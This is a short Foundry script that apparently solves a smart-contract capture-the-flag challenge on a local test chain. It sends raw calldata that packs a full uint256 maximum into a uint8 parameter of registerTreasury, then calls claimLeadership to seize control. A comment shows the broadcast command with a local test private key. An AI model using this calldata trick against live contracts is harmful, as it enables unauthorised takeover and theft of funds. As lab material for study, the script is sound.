// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}
contract SolveScript is Script {
    address public target = 0x3fA4E6e03Fbd434A577387924aF39efd3b4b50F2;

    function setUp() public {}

    // forge script -vvvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        (bool res, bytes memory resData) = target.call(abi.encodePacked(ITarget.registerTreasury.selector, uint256(type(uint256).max)));
        require(res);
        ITarget(target).claimLeadership();
        vm.stopBroadcast();
    }
}
